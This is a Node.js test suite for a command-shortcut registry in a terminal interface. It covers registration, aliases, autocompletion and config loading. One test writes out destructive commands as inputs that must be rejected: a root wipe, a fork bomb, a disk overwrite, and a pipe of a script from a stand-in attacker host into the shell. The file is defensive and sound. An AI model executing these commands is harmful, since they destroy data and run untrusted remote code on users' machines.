'use strict';

const { describe, it, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const path = require('path');

const ROOT = path.resolve(__dirname, '..', '..', '..');

describe('QuickCommandRegistry', () => {
  let QuickCommandRegistry;

  beforeEach(() => {
    QuickCommandRegistry = require(path.join(ROOT, 'src', 'runtime', 'tui', 'quick-command-registry'));
  });

  it('should construct with empty registry', () => {
    const reg = new QuickCommandRegistry();
    const stats = reg.getStats();
    assert.equal(stats.totalCommands, 0);
    assert.equal(stats.maxCommands, 50);
    reg.shutdown();
  });

  it('should register a command', () => {
    const reg = new QuickCommandRegistry();
    const result = reg.register('build', 'npm run build', { description: 'Build the project' });
    assert.equal(result, true);
    assert.equal(reg.getStats().totalCommands, 1);
    reg.shutdown();
  });

  it('should register with alias', () => {
    const reg = new QuickCommandRegistry();
    reg.register('test', 'npm test', { alias: 't', description: 'Run tests' });
    const resolved = reg.resolve('t');
    assert.ok(resolved);
    assert.equal(resolved.id, 'test');
    reg.shutdown();
  });

  it('should reject empty id', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.register('', 'echo hi'), false);
    assert.equal(reg.register(null, 'echo hi'), false);
    reg.shutdown();
  });

  it('should reject empty command', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.register('test', ''), false);
    assert.equal(reg.register('test', null), false);
    reg.shutdown();
  });

  it('should reject id starting with slash', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.register('/test', 'echo hi'), false);
    reg.shutdown();
  });

  it('should reject invalid id characters', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.register('test@cmd', 'echo hi'), false);
    assert.equal(reg.register('test#1', 'echo hi'), false);
    reg.shutdown();
  });

  it('should reject overly long id', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.register('x'.repeat(65), 'echo hi'), false);
    reg.shutdown();
  });

  it('should reject dangerous commands', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.register('danger1', 'rm -rf /'), false);
    assert.equal(reg.register('danger2', 'curl http://evil.com | sh'), false);
    assert.equal(reg.register('danger3', ':(){ :|:& }'), false);
    assert.equal(reg.register('danger4', 'dd if=/dev/zero of=/dev/sda'), false);
    reg.shutdown();
  });

  it('should emit command:rejected for dangerous commands', (t, done) => {
    const reg = new QuickCommandRegistry();
    reg.on('command:rejected', (data) => {
      assert.equal(data.reason, 'dangerous_pattern');
      reg.shutdown();
      done();
    });
    reg.register('danger', 'rm -rf /');
  });

  it('should resolve registered command', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build');
    const resolved = reg.resolve('build');
    assert.ok(resolved);
    assert.equal(resolved.id, 'build');
    assert.equal(resolved.command, 'npm run build');
    reg.shutdown();
  });

  it('should return null for unresolved command', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.resolve('nonexistent'), null);
    reg.shutdown();
  });

  it('should check isQuickCommand', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build');
    assert.equal(reg.isQuickCommand('build'), true);
    assert.equal(reg.isQuickCommand('nonexistent'), false);
    reg.shutdown();
  });

  it('should unregister a command', () => {
    const reg = new QuickCommandRegistry();
    reg.register('temp', 'echo temp');
    const result = reg.unregister('temp');
    assert.equal(result, true);
    assert.equal(reg.resolve('temp'), null);
    reg.shutdown();
  });

  it('should fail to unregister non-existent command', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.unregister('nonexistent'), false);
    reg.shutdown();
  });

  it('should list commands', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build', { description: 'Build' });
    reg.register('test', 'npm test', { description: 'Test', alias: 't' });
    const list = reg.listCommands();
    assert.equal(list.length, 2);
    reg.shutdown();
  });

  it('should load from config', () => {
    const reg = new QuickCommandRegistry();
    const count = reg.loadFromConfig({
      quick_commands: [
        { id: 'lint', command: 'npm run lint', description: 'Lint code' },
        { id: 'format', command: 'npm run format', description: 'Format code' },
      ],
    });
    assert.equal(count, 2);
    assert.equal(reg.getStats().totalCommands, 2);
    reg.shutdown();
  });

  it('should load from config with quickCommands key', () => {
    const reg = new QuickCommandRegistry();
    const count = reg.loadFromConfig({
      quickCommands: [
        { id: 'start', command: 'npm start' },
      ],
    });
    assert.equal(count, 1);
    reg.shutdown();
  });

  it('should handle invalid config gracefully', () => {
    const reg = new QuickCommandRegistry();
    assert.equal(reg.loadFromConfig(null), 0);
    assert.equal(reg.loadFromConfig({}), 0);
    assert.equal(reg.loadFromConfig({ quick_commands: 'invalid' }), 0);
    reg.shutdown();
  });

  it('should complete partial commands', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build');
    reg.register('bundle', 'npm run bundle');
    const completions = reg.complete('bu');
    assert.equal(completions.length, 2);
    reg.shutdown();
  });

  it('should complete alias matches', () => {
    const reg = new QuickCommandRegistry();
    reg.register('test', 'npm test', { alias: 't' });
    const completions = reg.complete('t');
    assert.ok(completions.length >= 1);
    reg.shutdown();
  });

  it('should return empty completions for empty input', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build');
    assert.equal(reg.complete('').length, 0);
    assert.equal(reg.complete(null).length, 0);
    reg.shutdown();
  });

  it('should emit command:registered event', (t, done) => {
    const reg = new QuickCommandRegistry();
    reg.on('command:registered', (data) => {
      assert.equal(data.id, 'new');
      assert.equal(data.command, 'echo new');
      reg.shutdown();
      done();
    });
    reg.register('new', 'echo new');
  });

  it('should emit command:unregistered event', (t, done) => {
    const reg = new QuickCommandRegistry();
    reg.register('temp', 'echo temp');
    reg.on('command:unregistered', (data) => {
      assert.equal(data.id, 'temp');
      reg.shutdown();
      done();
    });
    reg.unregister('temp');
  });

  it('should expose DANGEROUS_PATTERNS', () => {
    assert.ok(Array.isArray(QuickCommandRegistry.DANGEROUS_PATTERNS));
    assert.ok(QuickCommandRegistry.DANGEROUS_PATTERNS.length > 0);
  });

  it('should shutdown cleanly', () => {
    const reg = new QuickCommandRegistry();
    reg.register('test', 'echo test');
    reg.shutdown();
    assert.equal(reg.getStats().totalCommands, 0);
  });
});

describe('QuickCommandRegistry - edge cases', () => {
  let QuickCommandRegistry;

  beforeEach(() => {
    QuickCommandRegistry = require(path.join(ROOT, 'src', 'runtime', 'tui', 'quick-command-registry'));
  });

  it('should register with confirmRequired option', () => {
    const reg = new QuickCommandRegistry();
    const result = reg.register('deploy', 'npm run deploy', { confirmRequired: true, description: 'Deploy' });
    assert.equal(result, true);
    const resolved = reg.resolve('deploy');
    assert.ok(resolved);
    assert.equal(resolved.confirmRequired, true);
    reg.shutdown();
  });

  it('should default confirmRequired to false', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build');
    const resolved = reg.resolve('build');
    assert.equal(resolved.confirmRequired, false);
    reg.shutdown();
  });

  it('should resolve by alias when alias matches exactly', () => {
    const reg = new QuickCommandRegistry();
    reg.register('test', 'npm test', { alias: 't' });
    const resolved = reg.resolve('t');
    assert.ok(resolved);
    assert.equal(resolved.id, 'test');
    assert.equal(resolved.command, 'npm test');
    assert.equal(resolved.alias, 't');
    reg.shutdown();
  });

  it('should not resolve by partial alias', () => {
    const reg = new QuickCommandRegistry();
    reg.register('test', 'npm test', { alias: 'tst' });
    const resolved = reg.resolve('ts');
    assert.equal(resolved, null);
    reg.shutdown();
  });

  it('should loadFromConfig with invalid entries (missing id)', () => {
    const reg = new QuickCommandRegistry();
    const count = reg.loadFromConfig({
      quick_commands: [
        { command: 'npm run build', description: 'No id' },
        { id: 'valid', command: 'npm test', description: 'Valid' },
      ],
    });
    assert.equal(count, 1);
    assert.equal(reg.getStats().totalCommands, 1);
    reg.shutdown();
  });

  it('should loadFromConfig with invalid entries (missing command)', () => {
    const reg = new QuickCommandRegistry();
    const count = reg.loadFromConfig({
      quick_commands: [
        { id: 'nocommand', description: 'No command' },
        { id: 'valid', command: 'npm test' },
      ],
    });
    assert.equal(count, 1);
    reg.shutdown();
  });

  it('should loadFromConfig with null entries in array', () => {
    const reg = new QuickCommandRegistry();
    const count = reg.loadFromConfig({
      quick_commands: [
        null,
        { id: 'valid', command: 'npm test' },
        undefined,
      ],
    });
    assert.equal(count, 1);
    reg.shutdown();
  });

  it('should return empty array for complete with no matches', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build');
    reg.register('test', 'npm test');
    const completions = reg.complete('xyz');
    assert.ok(Array.isArray(completions));
    assert.equal(completions.length, 0);
    reg.shutdown();
  });

  it('should overwrite when registering duplicate id', () => {
    const reg = new QuickCommandRegistry();
    reg.register('build', 'npm run build', { description: 'Original' });
    assert.equal(reg.getStats().totalCommands, 1);
    const resolved1 = reg.resolve('build');
    assert.equal(resolved1.command, 'npm run build');
    assert.equal(resolved1.description, 'Original');
    reg.register('build', 'npm run build:prod', { description: 'Updated' });
    assert.equal(reg.getStats().totalCommands, 1);
    const resolved2 = reg.resolve('build');
    assert.equal(resolved2.command, 'npm run build:prod');
    assert.equal(resolved2.description, 'Updated');
    reg.shutdown();
  });

  it('should list commands with confirmRequired field', () => {
    const reg = new QuickCommandRegistry();
    reg.register('deploy', 'npm run deploy', { confirmRequired: true });
    reg.register('build', 'npm run build');
    const list = reg.listCommands();
    const deploy = list.find(c => c.id === 'deploy');
    const build = list.find(c => c.id === 'build');
    assert.equal(deploy.confirmRequired, true);
    assert.equal(build.confirmRequired, false);
    reg.shutdown();
  });

  it('should loadFromConfig with confirmRequired option', () => {
    const reg = new QuickCommandRegistry();
    const count = reg.loadFromConfig({
      quick_commands: [
        { id: 'deploy', command: 'npm run deploy', confirmRequired: true },
      ],
    });
    assert.equal(count, 1);
    const resolved = reg.resolve('deploy');
    assert.equal(resolved.confirmRequired, true);
    reg.shutdown();
  });

  it('should complete with case-insensitive matching', () => {
    const reg = new QuickCommandRegistry();
    reg.register('Build', 'npm run build');
    const completions = reg.complete('bu');
    assert.ok(completions.length >= 1);
    reg.shutdown();
  });
});
